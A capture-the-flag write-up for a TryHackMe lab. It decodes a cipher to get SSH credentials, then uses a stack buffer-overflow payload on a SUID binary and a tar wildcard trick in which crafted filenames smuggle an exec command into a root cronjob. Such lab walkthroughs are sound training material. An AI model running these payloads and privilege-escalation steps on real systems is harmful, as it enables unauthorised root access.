
# Anonymous Playground: THM writeup

Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?

![](https://cdn-images-1.medium.com/max/2000/1*hYVQpCfsZwndvBVEuX2vug.png)

This was a difficult room with tags linux python and cipher .

## Nmap Scan

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 60:b6:ad:4c:3e:f9:d2:ec:8b:cd:3b:45:a5:ac:5f:83 (RSA)
    |   256 6f:9a:be:df:fc:95:a2:31:8f:db:e5:a2:da:8a:0c:3c (ECDSA)
    |_  256 e6:98:52:49:cf:f2:b8:65:d7:41:1c:83:2e:94:24:88 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-robots.txt: 1 disallowed entry 
    |_/zYdHuAKjP
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Proving Grounds
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

We can see entry in robots.txt /zYdHuAKjP

The home page has an anonymous logo and has a link to the operatives.php page.

![HomePage](https://cdn-images-1.medium.com/max/2000/1*A4iJpXsoDXUhZp4WsYRSmg.png)*HomePage*

Operatives.php has some operatives name which could be possible usernames for logging in the system.

![Operatives.php](https://cdn-images-1.medium.com/max/2000/1*891x2TgVOLe5EpJnp-Wurg.png)*Operatives.php*

Looking a the disallowed page /zYdHuAKjP

![](https://cdn-images-1.medium.com/max/2000/1*7cWQov4Kg584UlxKPTuwmA.png)

There is a cookie access which is set to denied. If we change the cookie value to granted we get a ciphertext.

![](https://cdn-images-1.medium.com/max/2000/1*cdHn-XSqmOrW1A75VKcbFA.png)

The ciphertext looks like credentials with user:: password format. The hint said to write a python code to convert ‘zA’ to ‘a’. If we analyze the ciphertext and replace zA with a.

hE a dC fH a :: hE a dC fH a hA iJ a eI aD jB cB hH gA a fH fN

I tried different logics but none of them worked. The operatives.php has bunch of usernames and ‘magna’ matches with the first part of the cipher.

Which means

    hE = m
    zA = a
    dC = g
    fH = n
    zA = a
    The cipher looks like : 
    final = ord(second_character)-64+ord(first_character)

    #If character lies above "z" in ascii table then

    if final > ord("z"):
        final = (final%ord("z"))+ord("a")-1
    chr(final)

What above code does is

* First, convert the ASCII of the second character to alphabetic number
i.e 'A': 1
 'B' : 2 ....

* Add this to ASCII of the second character and find the resulting character.

* If the resulting character is higher than the ASCII value of z then higher value is to be added to the ASCII value of a

On doing this for the cipher, we get the credentials

    magna :: <Password>

On logging in through SSH we get the first flag.

## Inside the system

There is a binary **hacktheworld**

![](https://cdn-images-1.medium.com/max/2000/1*Wj645VtLvUSJTjInDGRpeg.png)

We see that the binary has suid set and a note from spooky says we need to reverse engineer the binary.

Reversing using ghidra

We can see two user-defined functions main and call_bash.

![main function decompiled using ghidra.](https://cdn-images-1.medium.com/max/2000/1*k4hVAIMWGwvOXVQic9DRjA.png)*main function decompiled using ghidra.*

This function takes the user input and stored it. The local_48 variable is 64bytes long and since gets is used, there is the possibility of buffer overflow attack.

![call_bash function decompiled using ghidra.](https://cdn-images-1.medium.com/max/2000/1*LPubq3Myi50R49FkqmoALA.png)*call_bash function decompiled using ghidra.*

This function just prints some strings. setuid(0x539) changes the suid to user spooky(*spooky uid is 1337*) so when /bin/sh is called, we get user spooky’s shell.

Also, call_bash is not called in the main function. So I thought we need to call the call_bash function using buffer overflow attack and get a shell.

On enumerating the machine, we can find a cronjob running

![](https://cdn-images-1.medium.com/max/2000/1*yX_ZDfmXO42vBUKuCldEXg.png)

The highlighted line first changes the directory to /home/spooky and creates a tar of the files in that directory. Downloaded and extracted the file to get the second flag.

![](https://cdn-images-1.medium.com/max/2000/1*2sRACuKlSslK-mw9N3P0wg.png)

## Buffer overflow

On analyzing the binary with **checksec**,

![](https://cdn-images-1.medium.com/max/2000/1*7EHxzu_W-5OYSED0RdOFRw.png)

Since NX is enabled, we cannot execute shellcode in the stack. So a possible option will be to call the call_bash function.

On analyzing the binary, we can get the offset at 72 bytes.

![](https://cdn-images-1.medium.com/max/2000/1*pLkSv9Ely5bPnu6ss4R2eQ.png)

Now we need to find the address of call_bash function and replace it with BBBB. So that RIP is replaced by call_bash function’s address as a result, the call_bash function is called.

![](https://cdn-images-1.medium.com/max/2000/1*wOl0rSfb68bNKQCIg63HQA.png)

So our payload will be

    $ python -c "print 'A'*72+'\x57\x06\x40\x00\x00\x00\x00\x00'" | ./hacktheworld

![](https://cdn-images-1.medium.com/max/2000/1*5D9R3D9grXMS7O3Ik3xhxw.png)

In order to check if the system(“/bin/sh”) is executed or not, I checked using gdb.

    $ python -c "print 'A'*72+'\x57\x06\x40\x00\x00\x00\x00\x00'" > ro
    #Store the exploit is a file
    $ gdb ./hacktheworld    # run gdb
    (gdb) break call_bash   # set breakpoint call_bash function
    (gdb) run < ro          # run the program with the input from ro

The breakpoint hits

    Starting program: /home/magna/hacktheworld < ro
    Breakpoint 1, 0x000000000040065b in call_bash ()

Now let's disassemble the function and set the breakpoint on the system function.

![](https://cdn-images-1.medium.com/max/2000/1*U5hqokkd-9lUtL9nnIFjsQ.png)

Now continue the execution with c command

    (gdb) c
    Continuing.
    Who do you want to hack? 
    We are Anonymous.
    We are Legion.
    We do not forgive.
    We do not forget.
    [Message corrupted]...Well...done.

    Breakpoint 2, 0x00000000004006d0 in call_bash ()
    # we are hitting the second breakpoint

If we run now with single-step mode with command s

    (gdb) s
    Single stepping until exit from function call_bash,
    which has no line number information.
    __libc_system (line=0x400803 "/bin/sh") at ../sysdeps/posix/system.c:180
    180     ../sysdeps/posix/system.c: No such file or directory.
    (gdb)

We can see “/bin/sh” is being called. So the shell must have closed.

On running that we can see the call_bash function is executed but we didn’t get a shell. [Here](https://youtu.be/HSlhY4Uy8SA?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&t=626) Live Overflow explains why this we didn’t get the shell.

So in order to overcome that, the command looks like

    $ (python -c "print 'A'*72+'\x57\x06\x40\x00\x00\x00\x00\x00'"; cat)  | ./hacktheworld

![](https://cdn-images-1.medium.com/max/2000/1*Ez3wzMv1wDDZQb2w-JbaJw.png)

Still no shell.

Consulted this with my friend, and he suggested me to call the function twice. In order to do that, we need to replace the return address of the function in the stack with the address of call_bash. For that our payload becomes

    $ (python -c "print 'A'*72+'\x57\x06\x40\x00\x00\x00\x00\x00\x57\x06\x40\x00\x00\x00\x00\x00'"; cat)  | ./hacktheworld

On executing this we get a shell with user spooky.

![](https://cdn-images-1.medium.com/max/2000/1*03k9gnN-mXzj1a93tqWHiA.png)

Now we need to escalate privilege to gain root. From the cronjob we know that the system is backing up the spooky user’s home directory with root user running the tar command

    */1 *   * * *   root    cd /home/spooky && tar -zcf /var/backups/spooky.tgz *

Googling privilege escalation with tar, I found [this](https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e) which is similar to our case.

Since wildcard * is used which means the * are the files in the spooky user’s home directory. And it is the argument to tar command. So, we can control the arguments to the tar command running as root.

Since we can control the parameters, let's create file with a name “ — checkpoint=1” and “ — checkpoint-action=exec=sh ro.sh” and ro.sh has the command to execute.

    $ echo "ro" > "--checkpoint=1"
    $ echo "ro" > "--checkpoint-action=exec=sh ro.sh"
    $ echo "chmod 777 /root" > ro.sh

When the cron job runs we get 777 permission on the /root directory and we can get the flag. Alternatively, we could add an entry to the /etc/sudoers file and get full sudo privilege on the machine.

Hope you liked the writeup. If you have any suggestions feel free to comment.
